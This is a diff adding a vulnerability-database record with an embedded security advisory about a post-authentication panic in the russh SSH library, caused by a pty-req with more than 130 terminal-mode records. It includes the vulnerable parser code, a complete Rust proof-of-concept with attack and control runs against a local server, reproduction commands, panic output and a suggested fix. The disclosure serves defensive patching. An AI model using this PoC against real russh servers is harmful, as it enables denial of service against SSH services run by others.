@@ -1,0 +1,301 @@
+[basic]
+description = '''
+## Summary
+
+A post-authentication denial-of-service panic in `russh` 0.62.2 (commit
+`c4be19f1915c8682f4615c3fd50008512b474491`, current default branch `main` as
+of 2026-07-22). An authenticated client sends a `pty-req` channel request
+carrying more than 130 terminal-mode records. The parser uses a fixed
+`[(Pty::TTY_OP_END, 0); 130]` array but increments its counter `i` for every
+valid record (logging \"too many pty codes\" without returning), then slices
+`&modes[0..i]` — an out-of-bounds slice that **panics** (`range end index 131
+out of range for slice of length 130`) before the application `pty_request`
+handler runs.
+
+This is reachable with the **default** server configuration and the **default**
+crypto config (curve25519-sha256 + chacha20-poly1305), requiring only an
+authenticated session channel — no caller-supplied parameter. It is reproduced
+end-to-end against the unmodified real russh 0.62.2 library (a real
+`russh::client` + `russh::server` over TCP, using the public
+`Channel::request_pty(...)` API); the PoC below links the real crate, not a
+copied snippet. The defect is still present on `main` HEAD (`v0.62.3`,
+2026-07-22) and is not covered by any of the 11 published russh GHSA
+advisories (GHSA-4r3c-5hpg-58qr / CVE-2026-48110 is allocation-first string
+parsing, not the fixed-array slice overflow; it was fixed in 0.61.0 but this
+code path still overflows the fixed array).
+
+Rust bounds-checked panics abort the task safely (no memory corruption / RCE);
+the impact is remote **denial of service**.
+
+## Details
+
+`russh/src/server/encrypted.rs`, `pty-req` handling (lines 1137–1201):
+
+```rust
+let mut modes = [(Pty::TTY_OP_END, 0); 130];     // fixed 130-entry array (line 1137)
+let mut i = 0;
+...
+while !mode_bytes.is_empty() {
+    let code = mode_bytes[0];
+    if code == 0 { if mode_bytes.len() != 1 { return Err(...); } break; }
+    if mode_bytes.len() < 5 { return Err(...); }
+    let num = BigEndian::read_u32(&mode_bytes[1..5]);
+    if let Some(code) = Pty::from_u8(code) {
+        if i < 130 {
+            modes[i] = (code, num);
+        } else {
+            error!(\"pty-req: too many pty codes\");   // logs, does NOT return (line 1162)
+        }
+    }
+    i += 1;                                          // keeps growing past 130
+    mode_bytes = &mode_bytes[5..];
+}
+...
+handler.pty_request(channel_num, &term, ..., &modes[0..i], self).await  // line 1201 — OOB when i > 130
+```
+
+Each terminal-mode record is exactly 5 bytes (1-byte opcode + 4-byte value),
+and `i += 1` runs for **every** valid record (including repeats of the same
+opcode). The `if i < 130` write-gate prevents an in-array overflow but the
+counter still grows unbounded, and the later `&modes[0..i]` slice has no
+corresponding bound. SSH packet-size limits do not bound the mode count to
+130, so a single normal-sized `pty-req` can carry hundreds of mode records.
+The client's own `request_pty` serialization (`russh/src/client/session.rs`:
+
+```rust
+((1 + 5 * terminal_modes.len()) as u32).encode(&mut enc.write)?;   // line 129
+for &(code, value) in terminal_modes {
+    if code == Pty::TTY_OP_END { continue; }
+    (code as u8).encode(&mut enc.write)?;
+    value.encode(&mut enc.write)?;                                   // line 135
+}
+```
+
+writes every record with no count cap, so 131 records reach the server as a
+legitimate authenticated channel request.
+
+## PoC
+
+The PoC is a standalone `examples/` binary that links the **unmodified** real
+russh 0.62.2 crate and reproduces over a real TCP connection with the default
+crypto config. It runs an ATTACK case (131 mode records → panic) and a CONTROL
+case (130 mode records → parses fine), proving the panic is caused
+specifically by exceeding the 130-entry array.
+
+### One-line reproducer
+
+```bash
+# Drop the .rs below into russh/examples/ of a checkout of
+# Eugeny/russh @ c4be19f1915c (tag v0.62.2), then:
+cargo +stable build --release --example e2e_c15_pty_modes_panic
+RUST_BACKTRACE=1 ./target/release/examples/e2e_c15_pty_modes_panic
+```
+
+### `russh/examples/e2e_c15_pty_modes_panic.rs`
+
+```rust
+// End-to-end PoC: an authenticated pty-req with more than 130 terminal-mode
+// records panics the russh server in its pty-req parser.
+//
+// A real `russh::client` + `russh::server` with the DEFAULT crypto config
+// (curve25519-sha256 + chacha20-poly1305). The client authenticates (auth_none),
+// opens a session channel, and calls the public Channel::request_pty(...) API
+// with 131 (ATTACK) and 130 (CONTROL) terminal-mode records. The server
+// panics in its pty-req parser (&modes[0..i] OOB) on 131, parses fine on 130.
+
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::{Arc, Mutex};
+
+use russh::keys::Algorithm;
+use russh::server::{self, Auth, ChannelOpenHandle, Handler, Msg, Session};
+use russh::{Channel, ChannelId, Pty};
+use tokio::net::TcpListener;
+
+#[tokio::main]
+async fn main() {
+    println!(\"=== russh pty-req mode overflow panic (real russh 0.62.2, default crypto) ===\n\");
+
+    let (atk_panic, atk_handler) = run_case(131, \"ATTACK \").await; // expect panic
+    println!();
+    let (ctl_panic, ctl_handler) = run_case(130, \"CONTROL\").await; // expect ok
+
+    println!(\"\n=== summary ===\");
+    println!(\"case    | server panicked | pty_request handler ran\");
+    println!(\"ATTACK  | {atk_panic:<15} | {atk_handler}   (131 mode records)\");
+    println!(\"CONTROL | {ctl_panic:<15} | {ctl_handler}   (130 mode records)\");
+
+    if atk_panic && !atk_handler && !ctl_panic && ctl_handler {
+        println!(\"\n=> CONFIRMED (end-to-end, real russh 0.62.2):\");
+        println!(\"   A single authenticated SSH_MSG_CHANNEL_REQUEST `pty-req`\");
+        println!(\"   carrying 131 valid terminal-mode records makes the real\");
+        println!(\"   russh server panic in its pty-req parser\");
+        println!(\"   (range end index 131 out of range for slice of length 130)\");
+        println!(\"   before the application pty_request handler runs.\");
+    } else {
+        eprintln!(\"NOT reproduced\");
+        std::process::exit(1);
+    }
+}
+
+async fn run_case(num_modes: usize, label: &'static str) -> (bool, bool) {
+    let panicked = Arc::new(AtomicBool::new(false));
+    {
+        let flag = panicked.clone();
+        let prev = std::panic::take_hook();
+        std::panic::set_hook(Box::new(move |info| {
+            flag.store(true, Ordering::SeqCst);
+            eprintln!(\"[{label} server task panicked] {info}\");
+            prev(info);
+        }));
+    }
+
+    let events: Arc<Mutex<Vec<&'static str>>> = Arc::new(Mutex::new(Vec::new()));
+
+    // real russh server, DEFAULT crypto config (curve25519 + chacha20)
+    let mut config = server::Config::default();
+    config.inactivity_timeout = None;
+    config.auth_rejection_time = std::time::Duration::from_millis(1);
+    config.auth_rejection_time_initial = Some(std::time::Duration::from_millis(1));
+    config.keys.push(russh::keys::PrivateKey::random(&mut rand::rng(), Algorithm::Ed25519).unwrap());
+    let config = Arc::new(config);
+
+    let listener = TcpListener::bind(\"127.0.0.1:0\").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+
+    let server_events = events.clone();
+    let server_task = tokio::spawn(async move {
+        let (socket, _peer) = listener.accept().await.unwrap();
+        let handler = PtyServer { events: server_events };
+        let session = server::run_stream(config, socket, handler).await.unwrap();
+        session.await
+    });
+
+    // real russh client (default config: real ECDH + encryption + auth)
+    let client_config = Arc::new(russh::client::Config::default());
+    let mut session = russh::client::connect(client_config, addr, AcceptAllClient {}).await.unwrap();
+    let auth = session.authenticate_none(\"attacker\").await.unwrap();
+    assert!(auth.success(), \"[{label}] auth_none did not succeed\");
+
+    let channel = session.channel_open_session().await.unwrap();
+    println!(\"[{label}] authenticated + opened session channel\");
+
+    // terminal_modes: num_modes records of (VINTR, 42). The client serializes
+    // all of them with no count cap (client/session.rs:129-137).
+    let modes: Vec<(Pty, u32)> = vec![(Pty::VINTR, 42u32); num_modes];
+    let want_reply = true;
+
+    let pty_result = tokio::time::timeout(
+        std::time::Duration::from_secs(3),
+        channel.request_pty(want_reply, \"xterm\", 80, 24, 0, 0, &modes),
+    ).await;
+    println!(\"[{label}] client request_pty({num_modes} modes) -> {pty_result:?}\");
+
+    let _ = tokio::time::timeout(std::time::Duration::from_secs(1), server_task).await;
+    let server_panicked = panicked.load(Ordering::SeqCst);
+    let handler_ran = events.lock().unwrap().contains(&\"pty_request\");
+    println!(\"[{label}] server task panicked = {server_panicked}, pty_request handler ran = {handler_ran}\");
+    let _ = std::panic::take_hook();
+    (server_panicked, handler_ran)
+}
+
+#[derive(Clone)]
+struct PtyServer { events: Arc<Mutex<Vec<&'static str>>> }
+impl PtyServer {
+    fn record(&self, e: &'static str) { self.events.lock().unwrap().push(e); }
+}
+impl Handler for PtyServer {
+    type Error = russh::Error;
+    async fn auth_none(&mut self, _user: &str) -> Result<Auth, Self::Error> { Ok(Auth::Accept) }
+    async fn channel_open_session(
+        &mut self, _channel: Channel<Msg>, reply: ChannelOpenHandle, _session: &mut Session,
+    ) -> Result<(), Self::Error> { reply.accept().await; Ok(()) }
+    async fn pty_request(
+        &mut self, _channel: ChannelId, _term: &str, _col_width: u32, _row_height: u32,
+        _pix_width: u32, _pix_height: u32, _modes: &[(Pty, u32)], _session: &mut Session,
+    ) -> Result<(), Self::Error> { self.record(\"pty_request\"); Ok(()) }
+}
+
+#[derive(Clone)]
+struct AcceptAllClient {}
+impl russh::client::Handler for AcceptAllClient {
+    type Error = russh::Error;
+    async fn check_server_key(
+        &mut self, _server_public_key: &russh::keys::PublicKey,
+    ) -> Result<bool, Self::Error> { Ok(true) }
+}
+```
+
+Real captured output (ATTACK, `RUST_BACKTRACE=1`):
+
+```
+[ATTACK ] client request_pty(131 modes) -> Ok(Ok(()))
+[ATTACK  server task panicked] panicked at russh/src/server/encrypted.rs:1201:39:
+range end index 131 out of range for slice of length 130
+thread 'tokio-rt-worker' panicked at russh/src/server/encrypted.rs:1201:39
+stack backtrace:
+   3: <Session>::server_read_authenticated::<PtyServer>
+   4: <Session>::process_packet::<PtyServer>
+   5: russh::server::reply::<PtyServer>
+[ATTACK ] server task panicked = true, pty_request handler ran = false
+[CONTROL] server task panicked = false, pty_request handler ran = true
+=> CONFIRMED (end-to-end, real russh 0.62.2)
+```
+
+The panic occurs in russh's own post-auth parser before any application
+handler is invoked.
+
+## Impact
+
+**Remote, post-authentication denial of service of any russh SSH server using
+the default configuration.** Any authenticated client with a session channel can
+crash the russh server task with a single `SSH_MSG_CHANNEL_REQUEST` `pty-req`
+carrying 131+ terminal-mode records (each record is 5 bytes, so 131 records
+fit in one normal-sized packet). This is trivially reachable for any legitimate
+or compromised SSH user. DoS only — Rust bounds-checked panics abort the task
+safely; there is no memory corruption or RCE.
+
+### Suggested fix
+
+Cap `i` at 130 and reject the request instead of logging and continuing:
+
+```rust
+if i >= 130 {
+    return Err(Error::Inconsistent.into());   // reject instead of logging+continuing
+}
+modes[i] = (code, num);
+```
+
+### Affected versions
+
+- `russh` **<= 0.62.3** (commit `c4be19f1915c` / current `main` HEAD
+  `v0.62.3`, 2026-07-22). The bug is still present on `main`; it is not covered
+  by any of the 11 published russh GHSA advisories. Default `server::Config`
+  and `client::Config` are affected (no feature flag or opt-in).
+
+## Credit
+
+Reported by the diff/ambidiff security research effort (afldl). Happy to
+coordinate a disclosure timeline; will request a CVE once confirmed.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Russh: Post-auth remote panic via pty-req with more than 130 terminal-mode records"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-cqjc-rmpq-xprq"]
+ave_id = "AVE-2026-1074"
+
+[meta]
+collected_at = "2026-08-06T01:16:09.539161146+00:00"
+status = "completed"
+
+[references]
+urls = []
